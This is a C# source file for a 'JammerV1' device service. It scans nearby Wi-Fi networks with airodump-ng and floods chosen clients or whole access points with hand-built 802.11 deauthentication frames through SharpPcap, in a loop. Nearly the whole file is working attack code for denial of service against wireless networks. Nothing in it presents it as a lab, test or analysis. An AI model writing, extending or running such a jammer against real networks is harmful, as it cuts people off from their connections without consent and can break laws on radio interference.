using System.Threading.Tasks;
using System.Globalization;
using System.Threading;
using System;
using SharpPcap;
using CliWrap;
using CliWrap.Buffered;
using JammerV1.Models;

public class DeviceService : IDeviceService {

    private IInjectionDevice _captureDevice = null;

    public IInjectionDevice CaptureDevice { get => _captureDevice; }

    public async Task OpenDevice()
    {
        // TODO: Here, going to need checks for: permissions, no device available, device can't do monitor mode
        _captureDevice = CaptureDeviceList.Instance[1];
        _captureDevice.Open(DeviceModes.Promiscuous);
    }

    public async Task JamClient(Client client) {
        // Need to parse the AP BSSID (string -> bytes)
        string[] bssidParts = client.BSSID.Split(":");
        byte[] bssidBytes = new byte[bssidParts.Length];
        for (int i = 0; i < bssidParts.Length; i++)
        {
            bssidBytes[i] = byte.Parse(bssidParts[i], NumberStyles.HexNumber);
        }

        string[] stationMacParts = client.StationMAC.Split(":");
        byte[] stationMacBytes = new byte[stationMacParts.Length];
        for (int i = 0; i < stationMacParts.Length; i++)
        {
            stationMacBytes[i] = byte.Parse(stationMacParts[i], NumberStyles.HexNumber);
        }

        byte[] deauthFrame = new byte[] {
                0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                0xc0, // Type / subtype - De-authentication
                0x00, 0x3a, 0x01, // Duration Garbage
                stationMacBytes[0], stationMacBytes[1], stationMacBytes[2], stationMacBytes[3], stationMacBytes[4], stationMacBytes[5], // Destination address
                bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                0x00, 0x48, // Sequence garbage
                0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
        };
        try
        {
            while (client.IsJammed)
            {
                await Task.Delay(100);
                _captureDevice.SendPacket(deauthFrame);
            }
        }
        catch (PcapException)
        {

        }
        finally
        {
            _captureDevice.Close();
        }
    }

    public async Task JamAP(AP ap) { 
        // Need to parse the AP BSSID (string -> bytes)
        string[] parts = ap.BSSID.Split(":");
        byte[] bssidBytes = new byte[parts.Length];
        for (int i = 0; i < parts.Length; i++)
        {
            bssidBytes[i] = byte.Parse(parts[i], NumberStyles.HexNumber);
        }
        byte[] deauthFrame = new byte[] {
                0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, // Radiotap header - junk
                0xc0, // Type / subtype - De-authentication
                0x00, 0x3a, 0x01, // Duration Garbage
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
                bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // Source Address
                bssidBytes[0], bssidBytes[1], bssidBytes[2], bssidBytes[3], bssidBytes[4], bssidBytes[5], // BSSID (Target AP MAC)
                0x00, 0x48, // Sequence garbage
                0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
        };
        try
        {
            while (ap.IsJammed)
            {
                await Task.Delay(100);
                _captureDevice.SendPacket(deauthFrame);
            }
        }
        catch (PcapException) { }
        finally
        {
            _captureDevice.Close();
        }
    }

    public async Task Scan(int secondsToRun) {
        // First, use airodump-ng to get raw output
        using var cancellation_token = new CancellationTokenSource();
        var airodumpCmd = Cli.Wrap("airodump-ng")
            .WithArguments($"-a --write-interval 1 -w {Constants.Paths.BaseDirectory}/jammer wlan1mon");

        cancellation_token.CancelAfter(TimeSpan.FromSeconds(secondsToRun));

        // Execute airodump-ng command with handling for cancellation
        try
        {
            await airodumpCmd.ExecuteAsync(cancellation_token.Token);
        }
        catch (OperationCanceledException) { }

        // Now run the sed command to filter output
        try
        {
            var sedCmd = Cli.Wrap("sed")
                .WithArguments(new[] {
                    "-e", "/^[[:space:]]*$/d",
                    "-e", "/^BSSID/d",  
                    "-e", "/^Station MAC/d",
                    Constants.Paths.DirtyJammerOutputFilePath
                })
                .WithStandardOutputPipe(PipeTarget.ToFile(Constants.Paths.CleanedJammerOutputFilePath));

            var result = await sedCmd.ExecuteBufferedAsync();
        }
        catch (Exception) { }
    }
}